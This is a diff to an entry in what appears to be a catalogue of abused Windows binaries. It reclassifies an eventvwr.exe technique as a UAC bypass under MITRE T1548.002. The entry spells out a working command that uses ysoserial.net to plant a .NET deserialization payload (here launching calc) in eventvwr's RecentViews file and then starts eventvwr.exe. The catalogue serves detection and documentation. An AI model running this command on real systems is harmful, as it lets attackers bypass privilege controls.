@@ -14,9 +14,9 @@ Commands:
   - Command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c calc > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
     Description: During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net
     Usecase: Execute a command to bypass security restrictions that limit the use of command-line interpreters.
-    Category: Execute
+    Category: UAC Bypass
     Privileges: Administrator
-    MitreID: T1202
+    MitreID: T1548.002
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\eventvwr.exe
